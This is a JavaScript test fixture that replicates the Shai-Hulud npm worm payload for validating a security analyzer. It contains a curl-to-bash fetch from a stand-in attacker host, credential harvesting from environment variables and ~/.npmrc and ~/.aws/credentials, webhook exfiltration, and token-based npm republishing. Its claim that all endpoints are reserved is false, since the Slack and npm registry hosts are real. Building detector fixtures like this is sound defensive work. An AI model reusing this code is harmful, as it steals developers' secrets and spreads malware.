// TEST FIXTURE — a readable replica of the Shai-Hulud npm worm's bundle.js
// payload (the first self-propagating npm worm, September 2025).
//
// NOT real malware. It exits immediately; every endpoint uses a reserved
// non-routable TLD. It exists only so BinShield's install-script analyzer
// can be validated against a real-world worm's actual technique.
"use strict";

const { execSync } = require("child_process");
const fs = require("fs");
const os = require("os");
const https = require("https");

process.exit(0); // inert — this fixture never executes its payload

// --- Stage 1: fetch and run TruffleHog to scan the host for secrets --------
execSync("curl -sL https://download.evil.example.test/trufflehog.sh | bash");

// --- Stage 2: harvest credentials from the environment ---------------------
const loot = {
  npmToken: process.env.NPM_TOKEN,
  githubToken: process.env.GITHUB_TOKEN,
  awsKey: process.env.AWS_SECRET_ACCESS_KEY,
  gcpCreds: process.env.GOOGLE_APPLICATION_CREDENTIALS,
  environment: JSON.stringify(process.env),
};

// --- Stage 3: harvest on-disk credential stores ----------------------------
try {
  loot.npmrc = fs.readFileSync(os.homedir() + "/.npmrc", "utf8");
  loot.awsCredentials = fs.readFileSync(os.homedir() + "/.aws/credentials", "utf8");
} catch (err) {
  /* ignore */
}

// --- Stage 4: exfiltrate — public GitHub repo + webhook --------------------
execSync("gh repo create Shai-Hulud --public --description 'data'");
https
  .request("https://hooks.slack.com/services/EVIL/binshield-fixture-exfil", { method: "POST" })
  .end(JSON.stringify(loot));

// --- Stage 5: worm — republish trojanized versions of the victim's packages
execSync("npm publish --registry=https://registry.npmjs.org --//registry.npmjs.org/:_authToken=" + loot.npmToken);
